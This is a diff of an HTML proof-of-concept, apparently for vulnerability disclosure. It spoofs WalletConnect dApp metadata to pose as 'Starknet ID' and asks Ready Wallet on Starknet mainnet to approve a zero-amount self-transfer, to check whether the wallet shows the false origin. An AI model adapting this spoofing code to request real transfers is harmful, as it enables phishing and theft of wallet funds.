@@ -5,53 +5,106 @@
   <title>Ready Wallet PoC</title>
 </head>
 <body>
-  <h1>Ready Wallet PoC</h1>
-  <button id="connect">Connect</button>
-  <div id="link"></div>
+  <h1>Ready Wallet Origin Spoof PoC</h1>
+  <button id="connect">Connect + Send Transaction</button>
   <pre id="log"></pre>
 
   <script type="module">
     import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';
 
+    const REAL_ORIGIN = location.origin;
+    const CLAIMED_URL = 'https://app.starknet.id';
+    const CLAIMED_NAME = 'Starknet ID';
+
     const log = (msg) => document.getElementById('log').textContent += msg + '\n';
 
     document.getElementById('connect').onclick = async () => {
-      log('Loading...');
+      try {
+        log('Initializing...');
 
-      const provider = await UniversalProvider.init({
-        projectId: '2f05ae7f1116030fde2d36508f472bfb',
-        metadata: {
-          name: 'Starknet ID',
-          url: 'https://app.starknet.id',
-          description: '',
-          icons: []
-        }
-      });
-
-      const { uri, approval } = await provider.client.connect({
-        requiredNamespaces: {
-          starknet: {
-            chains: ['starknet:SNMAIN'],
-            methods: ['starknet_account'],
-            events: ['accountsChanged']
+        const provider = await UniversalProvider.init({
+          projectId: '2f05ae7f1116030fde2d36508f472bfb',
+          metadata: {
+            name: CLAIMED_NAME,
+            description: 'Spoofed dApp',
+            url: CLAIMED_URL,
+            icons: []
           }
+        });
+
+        log('Provider ready!');
+        log('Real origin  : ' + REAL_ORIGIN);
+        log('Claimed URL  : ' + CLAIMED_URL);
+
+        const { uri, approval } = await provider.client.connect({
+          requiredNamespaces: {
+            starknet: {
+              chains: ['starknet:SNMAIN'],
+              methods: [
+                'starknet_account',
+                'starknet_requestAddInvokeTransaction'
+              ],
+              events: ['accountsChanged', 'chainChanged']
+            }
+          }
+        });
+
+        if (uri) {
+          log('URI ready — waiting for wallet approval...');
+          log('(Approve connection di Ready Wallet)');
         }
-      });
 
-      log('URI ready!');
+        // Tunggu user approve connection
+        const session = await approval();
+        log('Connected!');
 
-      // Tampilkan link
-      document.getElementById('link').innerHTML = 
-        `<a href="ready://wc?uri=${encodeURIComponent(uri)}" 
-            style="font-size:20px; padding:12px; background:blue; 
-                   color:white; display:block; margin:10px 0; 
-                   border-radius:8px; text-align:center;">
-          Buka Ready Wallet
-        </a>`;
+        const accounts = session?.namespaces?.starknet?.accounts;
+        if (!accounts?.length) {
+          log('No accounts found!');
+          return;
+        }
 
-      const session = await approval();
-      log('Connected!');
-      log('Account: ' + session.namespaces.starknet.accounts[0]);
+        const account = accounts[0].split(':')[2];
+        log('Account: ' + account);
+        log('');
+        log('Sending transaction...');
+        log('(Cek domain yang tampil di popup Ready Wallet!)');
+
+        // Kirim transaksi — ini yang penting untuk cek origin spoof
+        const result = await provider.client.request({
+          topic: session.topic,
+          chainId: 'starknet:SNMAIN',
+          request: {
+            method: 'starknet_requestAddInvokeTransaction',
+            params: {
+              accountAddress: account,
+              executionRequest: {
+                calls: [
+                  {
+                    contractAddress: '0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7',
+                    entrypoint: 'transfer',
+                    calldata: [
+                      account,  // to (self)
+                      '0x0',    // amount low
+                      '0x0'     // amount high
+                    ]
+                  }
+                ]
+              }
+            }
+          }
+        });
+
+        log('');
+        log('=== RESULT ===');
+        log('TX Hash: ' + result?.transaction_hash);
+        log('Real origin  : ' + REAL_ORIGIN);
+        log('Claimed URL  : ' + CLAIMED_URL);
+        log('Kalau popup tampil app.starknet.id = ORIGIN SPOOF CONFIRMED!');
+
+      } catch(e) {
+        log('Error: ' + e.message);
+      }
     };
   </script>
 </body>
